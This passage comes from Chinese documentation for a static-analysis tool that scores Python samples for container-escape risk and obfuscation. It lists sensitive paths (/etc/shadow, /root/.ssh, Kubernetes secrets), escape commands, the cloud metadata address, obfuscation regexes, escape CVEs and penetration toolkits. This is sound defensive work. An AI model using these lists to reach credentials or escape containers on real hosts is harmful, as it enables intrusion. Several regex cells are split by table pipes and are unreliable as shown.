    "/.dockerenv", "/sys/fs/cgroup", "/etc/shadow", "/etc/passwd",
    "/var/run/secrets", "/root/.ssh", "/home/admin", "/etc/kubernetes",
    # 敏感命令
    "nsenter", "docker", "kubectl", "mount", "chroot", "capsh",
    # 敏感函数
    "eval", "exec", "system", "popen", "setns", "unshare",
    # 云元数据
    "169.254.169.254", "metadata.google.internal",
]
```

### 5.3 混淆检测模式


| 模式名称           | 正则表达式                                         | 说明                                          |
| -------------------- | ---------------------------------------------------- | ----------------------------------------------- |
| base64_decode      | `base64\.(b64decode                                | decodebytes                                   |
| base64_string      | `[A-Za-z0-9+/]{20,}={0,2}`                         | Base64特征字符串                              |
| hex_decode         | `bytes\.fromhex                                    | binascii\.(unhexlify                          |
| hex_string         | `\\x[0-9a-fA-F]{2}`                                | Hex转义字符                                   |
| unicode_escape     | `\\u[0-9a-fA-F]{4}`                                | Unicode转义                                   |
| rot13_decode       | `codecs\.decode.*rot[_-]?13`                       | ROT13解码                                     |
| string_concat      | `['\"][^'\"]{1,3}['\"]\s*\+\s*){3,}`               | 短字符串拼接                                  |
| chr_obfuscation    | `chr\s*\(\s*\d+\s*\)\s*\+?\s*){3,}`                | chr()函数拼接                                 |
| eval_exec          | `(eval                                             | exec                                          |
| getattr_call       | `getattr\s*\([^)]+,\s*['\"][^'\"]+['\"]\s*\)\s*\(` | getattr动态调用                               |
| globals_exec       | `(globals                                          | locals)\s*\(\s*\)\s*\[['\"][^'\"]+['\"]\s*\]` |
| zlib_decompress    | `(zlib                                             | gzip                                          |
| lambda_obfuscation | `lambda.*:(eval                                    | exec                                          |
| reflection_call    | `__getattribute__                                  | __subclasses__                                |

### 5.4 混淆风险等级判定

```python
# 混淆风险等级判定逻辑
technique_count = len(obfuscation_techniques)
keyword_count = len(decoded_sensitive_keywords)

if keyword_count > 0 and technique_count >= 2:
    risk_level = "CRITICAL"  # 解码出敏感关键词且使用多种混淆技术
elif keyword_count > 0 or technique_count >= 3:
    risk_level = "HIGH"      # 解码出敏感关键词或使用3种以上混淆技术
elif technique_count >= 2:
    risk_level = "MEDIUM"    # 使用2种混淆技术
elif technique_count >= 1:
    risk_level = "LOW"       # 使用1种混淆技术
else:
    risk_level = "SAFE"
```

---

## 6. 特征向量设计（128维）

### 6.1 特征维度分配


| 特征类别         | 维度      | 子类别数 | 每类特征数 |
| ------------------ | ----------- | ---------- | ------------ |
| 敏感函数频次特征 | 32维      | 8类      | 4特征/类   |
| 攻击模式特征     | 48维      | 12类     | 4特征/类   |
| 路径配置特征     | 24维      | 6类      | 4特征/类   |
| 混淆检测特征     | 24维      | 6类      | 4特征/类   |
| **总计**         | **128维** | -        | -          |

### 6.2 敏感函数类别（8类）

1. **system_commands**: os.system, subprocess.*, 命令执行
2. **process_control**: os.fork, os.dup2, pty.spawn, 进程控制
3. **dangerous_libs**: ctypes.CDLL, docker.*, kubernetes.*, 危险库
4. **network_ops**: socket.*, requests.*, urllib.*, 网络操作
5. **file_ops**: open, shutil.*, 文件操作
6. **dynamic_exec**: eval, exec, compile, __import__, 动态执行
7. **encoding_ops**: base64.*, codecs.*, binascii.*, 编码操作
8. **serialization**: pickle.*, yaml.*, marshal.*, 序列化

### 6.3 攻击模式类别（12类）

1. **cmd_execution**: 命令执行类攻击
2. **file_access**: 文件访问类攻击
3. **cgroup_kernel**: Cgroup/内核配置类攻击
4. **credential_access**: 凭证访问类攻击
5. **dangerous_libs**: 危险库调用类攻击
6. **container_sdk**: 容器SDK滥用类攻击
7. **network_recon**: 网络侦察类攻击
8. **kernel_exploits**: 内核漏洞利用类攻击
9. **runtime_exploits**: 运行时漏洞利用类攻击
10. **k8s_attacks**: K8s攻击类
11. **dos_attacks**: DoS攻击类
12. **misc_exploits**: 其他漏洞利用类

### 6.4 路径配置类别（6类）

1. **container_runtime**: 容器运行时路径
2. **proc_sensitive**: /proc敏感文件
3. **cgroup_sysfs**: Cgroup/Sysfs路径
4. **k8s_cloud_creds**: K8s/云凭证路径
5. **host_filesystem**: 宿主机文件系统
6. **device_files**: 设备文件

### 6.5 混淆检测类别（6类）

1. **encoding_decode**: 编码解码操作
2. **string_obfuscation**: 字符串混淆
3. **dynamic_execution**: 动态执行混淆
4. **compression**: 压缩混淆
5. **reflection**: 反射调用混淆
6. **format_tricks**: 格式化技巧混淆

### 6.6 每类4个特征

对于每个类别，提取以下4个特征：

1. **存在性（二值）**: 该类别是否存在匹配（0或1）
2. **对数频次**: log(1 + count)，平滑处理
3. **相对频率/多样性**: 匹配模式数/总模式数
4. **归一化频次**: min(count/10, 1.0)，上限归一化

---

## 7. 使用指南

### 7.1 基本使用

```bash
# 基本特征提取
python semantic_feature_extractor_v3.py sample.py

# 自定义输出路径
python semantic_feature_extractor_v3.py sample.py -o output_features.npy

# 保存AST JSON
python semantic_feature_extractor_v3.py sample.py --save-ast

# 生成AST可视化图
python semantic_feature_extractor_v3.py sample.py --visualize-ast
```

### 7.2 输出文件


| 文件                                           | 说明                       |
| ------------------------------------------------ | ---------------------------- |
| `*_container_escape_features.npy`              | 128维特征向量（NumPy格式） |
| `*_container_escape_features_risk_report.json` | 风险评估报告（JSON格式）   |
| `*.ast.json`                                   | AST JSON文件（可选）       |
| `*.ast.png`                                    | AST可视化图（可选）        |

### 7.3 风险报告示例

```json
{
  "source_file": "sample.py",
  "escape_risk": {
    "risk_level": "HIGH",
    "risk_score": 15.0,
    "indicators": {
      "CRITICAL": [...],
      "HIGH": [...],
      "MEDIUM": [...],
      "LOW": [...]
    },
    "summary": "发现 1 个CRITICAL风险, 发现 2 个HIGH风险"
  },
  "obfuscation": {
    "obfuscated": true,
    "obfuscation_score": 3,
    "reasons": ["base64解码", "eval/exec", "字符串拼接"]
  },
  "obfuscation_bypass": {
    "has_obfuscation": true,
    "risk_level": "CRITICAL",
    "decoded_sensitive_keywords": ["/var/run/docker.sock", "/proc/kcore"]
  }
}
```

---

## 8. 参考资料

### 8.1 CVE参考


| CVE编号        | 漏洞名称        | CVSS评分 |
| ---------------- | ----------------- | ---------- |
| CVE-2016-5195  | Dirty COW       | 7.8      |
| CVE-2019-5736  | runc逃逸        | 8.6      |
| CVE-2019-14271 | Docker cp       | 9.8      |
| CVE-2020-15257 | containerd-shim | 5.2      |
| CVE-2021-22555 | Netfilter       | 7.8      |
| CVE-2022-0185  | fsconfig        | 8.4      |
| CVE-2022-0492  | Cgroup v1       | 7.8      |
| CVE-2022-0847  | Dirty Pipe      | 7.8      |

### 8.2 相关工具

- CDK (Container penetration toolkit): https://github.com/cdk-team/CDK
- Deepce (Docker Enumeration): https://github.com/stealthcopter/deepce
- PEIRATES (K8s penetration): https://github.com/inguardians/peirates

### 8.3 参考文档

- Docker Security: https://docs.docker.com/engine/security/
- Kubernetes Security: https://kubernetes.io/docs/concepts/security/
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
- MITRE ATT&CK Containers: https://attack.mitre.org/matrices/enterprise/containers/

---

## 更新日志


| 版本 | 日期       | 更新内容                                                       |
| ------ | ------------ | ---------------------------------------------------------------- |
| v1.0 | 2026-01-10 | 初始版本                                                       |
| v2.0 | 2026-01-14 | 新增CVE检测规则，扩展攻击模式至50+，增强混淆检测，优化特征工程 |
